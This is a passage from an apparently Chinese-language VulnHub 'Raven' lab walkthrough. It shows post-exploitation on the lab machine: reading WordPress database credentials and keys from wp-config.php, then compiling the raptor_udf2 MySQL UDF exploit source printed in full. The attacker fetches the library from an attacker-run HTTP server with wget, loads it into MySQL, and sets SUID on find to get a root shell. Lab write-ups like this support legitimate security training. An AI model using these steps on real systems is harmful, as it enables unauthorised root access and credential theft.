.</span><br><span class="line">drwxr-xr-x 22 root    root     4096 Aug 13  2018 ..</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .font-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .ICE-unix</span><br><span class="line">-rwxrwxrwx  1 michael michael 46476 Dec 21 00:44 LinEnum.sh</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .XIM-unix</span><br></pre></td></tr></table></figure>

<p>然后运行脚本发现下面敏感信息输出结果如下<br>发现MySQL服务正在运行（端口3306很明显）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:60286           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::39258                :::*                    LISTEN      -               </span><br><span class="line"></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">udp        0      0 0.0.0.0:8641            0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:43233           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:995             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 127.0.0.1:1005          0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               </span><br><span class="line">udp6       0      0 :::11443                :::*                                -               </span><br><span class="line">udp6       0      0 :::995                  :::*                                -               </span><br><span class="line">udp6       0      0 :::52570                :::*                                -               </span><br><span class="line">udp6       0      0 :::111                  :::*                                -</span><br></pre></td></tr></table></figure>

<p>发现了一个MySQL开发漏洞，远程root代码执行，Privesc漏洞！</p>
<p>参考<span class="exturl" data-url="aHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvTXlTUUwtRXhwbG9pdC1SZW1vdGUtUm9vdC1Db2RlLUV4ZWN1dGlvbi1Qcml2ZXNjLUNWRS0yMDE2LTY2NjIuaHRtbA==">MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root       547  0.0  0.3   4340  1620 ?        S    04:11   0:00 /bin/sh /usr/bin/mysqld_safe</span><br><span class="line">root       895  0.0  4.5 232508 23072 ?        Ss   04:11   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">root       922  0.0 10.2 814920 51920 ?        Sl   04:12   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --<span class="built_in">log</span>-error=/var/<span class="built_in">log</span>/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306</span><br><span class="line">www-data   986  0.0  7.3 238928 37300 ?        S    04:12   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data   987  0.0  6.8 236172 34664 ?        S    04:12   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data   988  0.0  6.1 234084 31328 ?        S    04:12   0:00 /usr/sbin/apache2 -k start</span><br></pre></td></tr></table></figure>

<p>因此，将当前目录更改为/var/www/html/wordpress并搜索了wp-config文件，因为该文件具有MySQL数据库的密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ <span class="built_in">cd</span> /var/www/html/wordpress</span><br><span class="line">michael@Raven:/var/www/html/wordpress$ ls</span><br><span class="line">index.php    wp-activate.php     wp-comments-post.php  wp-content   wp-links-opml.php  wp-mail.php      wp-trackback.php</span><br><span class="line">license.txt  wp-admin            wp-config.php         wp-cron.php  wp-load.php        wp-settings.php  xmlrpc.php</span><br><span class="line">readme.html  wp-blog-header.php  wp-config-sample.php  wp-includes  wp-login.php       wp-signup.php</span><br><span class="line">michael@Raven:/var/www/html/wordpress$ cat wp-con</span><br><span class="line">wp-config.php         wp-config-sample.php  wp-content/           </span><br><span class="line">michael@Raven:/var/www/html/wordpress$ cat wp-config.php </span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>root<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>R@v3nSecurity<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all users to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;0&amp;ItXmn^q2d[e*yB:9,L:rR&lt;B`h+DG,zQ&amp;SN&#123;Or3zalh.JE+Q!Gi:L7U[(T:J5ay&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;y@^[*q&#123;)NKZAKK&#123;,AA4y-Ia*swA6/O@&amp;*r&#123;+RS*N!p1&amp;a$*ctt+ I/!?A/Tip(BG&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;.D4&#125;RE4rW2C@9^Bp%#U6i)?cs7,@e]YD:R~fp#hXOk$4o/yDO8b7I&amp;/F7SBSLPlj&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;4L&#123;Cq,%ce2?RRT7zue#R3DezpNq4sFvcCzF@zdmgL/fKpaGX:EpJt/]xZW1_H&amp;46&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;@@?u*YKtt:o/T&amp;V;cbb`.GaJ0./S@dn$t2~n+lR3&#123;PktK]2,*y/b%&lt;BH-Bd#I&#125;oE&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;f0Dc#lKmEJi(:-3+x.V#]Wy@mCmp%njtmFb6`_80[8FK,ZQ=+HH/$&amp; mn=]=/cvd&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;&#125;STRHqy,4scy7v &gt;-..Hc WD*h7rnYq]H`-glDfTVUaOwlh!-/?=3u;##:Rj1]7@&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;i(#~[sXA TbJJfdn&amp;D;0bd`p$r,~.o/?%m&lt;H+&lt;&gt;Vj+,nLvX!-jjjV-o6*HDh5Td&#123;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span>  = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy blogging. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( !defined(&#x27;</span>ABSPATH<span class="string">&#x27;) )</span></span><br><span class="line"><span class="string">        define(&#x27;</span>ABSPATH<span class="string">&#x27;, dirname(__FILE__) . &#x27;</span>/<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once(ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>发现密码为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">R@v3nSecurity</span><br></pre></td></tr></table></figure>

<h3 id="发现第一个flag"><a href="#发现第一个flag" class="headerlink" title="发现第一个flag"></a>发现第一个flag</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/var/www/html/wordpress$ find / -name <span class="string">&quot;flag*&quot;</span> 2&gt;/dev/null</span><br><span class="line">/var/www/flag2.txt</span><br><span class="line">/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html</span><br><span class="line">/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">michael@Raven:/var/www/html/wordpress$ cat /var/www/flag2.txt</span><br><span class="line">flag2&#123;fc3fd58dcdad9ab23faca6e9a36e581c&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mysql-udf提权"><a href="#mysql-udf提权" class="headerlink" title="mysql udf提权"></a>mysql udf提权</h3><p>因此，搜索了UDF动态库漏洞利用程序，并在漏洞利用数据库中将其命名为“1518.c”。</p>
<p>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * <span class="variable">$Id</span>: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $</span><br><span class="line"> *</span><br><span class="line"> * raptor_udf2.c - dynamic library <span class="keyword">for</span> do_system() MySQL UDF</span><br><span class="line"> * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"> *</span><br><span class="line"> * This is an helper dynamic library <span class="keyword">for</span> <span class="built_in">local</span> privilege escalation through</span><br><span class="line"> * MySQL run with root privileges (very bad idea!), slightly modified to work </span><br><span class="line"> * with newer versions of the open-source database. Tested on MySQL 4.1.14.</span><br><span class="line"> *</span><br><span class="line"> * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c</span><br><span class="line"> *</span><br><span class="line"> * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes</span><br><span class="line"> * <span class="keyword">for</span> the security vulnerabilities <span class="keyword">in</span> the handling of User Defined Functions</span><br><span class="line"> * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further</span><br><span class="line"> * details, please refer to:</span><br><span class="line"> *</span><br><span class="line"> * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=4</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=5</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=6</span><br><span class="line"> *</span><br><span class="line"> * <span class="string">&quot;UDFs should have at least one symbol defined in addition to the xxx symbol </span></span><br><span class="line"><span class="string"> * that corresponds to the main xxx() function. These auxiliary symbols </span></span><br><span class="line"><span class="string"> * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and </span></span><br><span class="line"><span class="string"> * xxx_add() functions&quot;</span>. -- User Defined Functions Security Precautions </span><br><span class="line"> *</span><br><span class="line"> * Usage:</span><br><span class="line"> * $ id</span><br><span class="line"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="line"> * $ gcc -g -c raptor_udf2.c</span><br><span class="line"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"> * $ mysql -u root -p</span><br><span class="line"> * Enter password:</span><br><span class="line"> * [...]</span><br><span class="line"> * mysql&gt; use mysql;</span><br><span class="line"> * mysql&gt; create table foo(line blob);</span><br><span class="line"> * mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/raptor/raptor_udf2.so&#x27;</span>));</span><br><span class="line"> * mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; select * from mysql.func;</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * | name      | ret | dl             | <span class="built_in">type</span>     |</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * | do_system |   2 | raptor_udf2.so | <span class="keyword">function</span> |</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * mysql&gt; select do_system(<span class="string">&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;</span>);</span><br><span class="line"> * mysql&gt; \! sh</span><br><span class="line"> * sh-2.05b$ cat /tmp/out</span><br><span class="line"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="line"> * [...]</span><br><span class="line"> *</span><br><span class="line"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_args &#123;</span><br><span class="line">    unsigned int        arg_count;    // number of arguments</span><br><span class="line">    enum Item_result    *arg_type;    // pointer to item_result</span><br><span class="line">    char             **args;        // pointer to arguments</span><br><span class="line">    unsigned long        *lengths;    // length of string args</span><br><span class="line">    char            *maybe_null;    // 1 <span class="keyword">for</span> maybe_null args</span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_init &#123;</span><br><span class="line">    char            maybe_null;    // 1 <span class="keyword">if</span> func can <span class="built_in">return</span> NULL</span><br><span class="line">    unsigned int        decimals;    // <span class="keyword">for</span> real <span class="built_in">functions</span></span><br><span class="line">    unsigned long         max_length;    // <span class="keyword">for</span> string <span class="built_in">functions</span></span><br><span class="line">    char            *ptr;        // free ptr <span class="keyword">for</span> func data</span><br><span class="line">    char            const_item;    // 0 <span class="keyword">if</span> result is constant</span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line">int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (args-&gt;arg_count != 1)</span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line"></span><br><span class="line">    system(args-&gt;args[0]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// milw0rm.com [2006-02-20]</span><br></pre></td></tr></table></figure>

<p>该漏洞利用是通过将原始C代码编译为“.so”文件，将其传输到受害计算机并利用MySQL漏洞来运行的。第一步是对其进行编译。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/1518.c .</span></span><br><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># ls</span></span><br><span class="line">1518.c</span><br><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc</span></span><br><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># ls</span></span><br><span class="line">1518.c  1518.so</span><br></pre></td></tr></table></figure>

<p>然后，启动了本地服务器，并将此1518.so文件传输到受害人的/tmp目录，因为使用wget命令可以通用地读取和写入该文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [14/Feb/2020 05:55:48] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [14/Feb/2020 05:55:55] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.118 - - [14/Feb/2020 05:56:12] <span class="string">&quot;GET /1518.so HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ wget 192.168.56.102:8000/1518.so</span><br><span class="line">--2020-02-15 05:56:10--  http://192.168.56.102:8000/1518.so</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 19088 (19K) [application/octet-stream]</span><br><span class="line">Saving to: ‘1518.so’</span><br><span class="line"></span><br><span class="line">1518.so                        100%[=====================================================&gt;]  18.64K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-02-15 05:56:10 (150 MB/s) - ‘1518.so’ saved [19088/19088]</span><br><span class="line"></span><br><span class="line">michael@Raven:/tmp$ chmod 777 *</span><br><span class="line">michael@Raven:/tmp$ ls -la</span><br><span class="line">total 152</span><br><span class="line">drwxrwxrwt  7 root    root     4096 Feb 15 05:56 .</span><br><span class="line">drwxr-xr-x 22 root    root     4096 Aug 13  2018 ..</span><br><span class="line">-rwxrwxrwx  1 michael michael 19088 Feb 14 21:50 1518.so</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .font-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .ICE-unix</span><br><span class="line">-rwxrwxrwx  1 michael michael 55193 Feb 15 04:48 info.txt</span><br><span class="line">-rwxrwxrwx  1 michael michael 46476 Dec 21 00:44 LinEnum.sh</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .XIM-unix</span><br></pre></td></tr></table></figure>

<p>下面连接数据库开始提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ mysql -uroot -pR@v3nSecurity</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 70</span><br><span class="line">Server version: 5.5.60-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>在获得MySQL Shell之后，开始使用刚刚发现的漏洞来利用它</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure>

<p>现在，创建一个名为“foo”的表在此表中，将链接插入了刚刚从本地计算机导入到/tmp目录的1518.so文件。将相同的文件转储到/usr/lib/mysql/plugin/目录（因为它容易受到攻击）在最重要的步骤中，创建了一个名为do_system的UDF函数，该函数将调用实现该函数的代码。因此，正在调用代码“chmod u + s /usr/bin/ find”以将粘性位设置为“find”</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/tmp/1518.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;1518.so&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>现在，遍历目录/tmp并使用find程序执行命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ touch raj</span><br><span class="line">michael@Raven:/tmp$ find raj -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br><span class="line">root</span><br><span class="line">michael@Raven:/tmp$ find raj -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag4.txt</span><br><span class="line"><span class="comment"># cat flag4.txt </span></span><br><span class="line">______                      </span><br><span class="line"></span><br><span class="line">| ___ \                     </span><br><span class="line"></span><br><span class="line">| |_/ /__ ___   _____ _ __  </span><br><span class="line"></span><br><span class="line">|    // _` \ \ / / _ \ <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">| |\ \ (_| |\ V /  __/ | | |</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\_| \_\__,_| \_/ \___|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            </span></span><br><span class="line"><span class="string">flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CONGRATULATIONS on successfully rooting Raven!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is my first Boot2Root VM - I hope you enjoyed it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hit me up on Twitter and let me know what you thought: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@mccannwj / wjmccann.github.io</span></span><br></pre></td></tr></table></figure>

<p>到这一步找到了第二个flag</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub212.jpg"></p>
<h3 id="提权方法二"><a href="#提权方法二" class="headerlink" title="提权方法二"></a>提权方法二</h3><p>如上所述到达MySQL Shell，然后采用替代方法。查看所有数据库，并从“WordPress”数据库中的wp_users表中转储用户名</p>
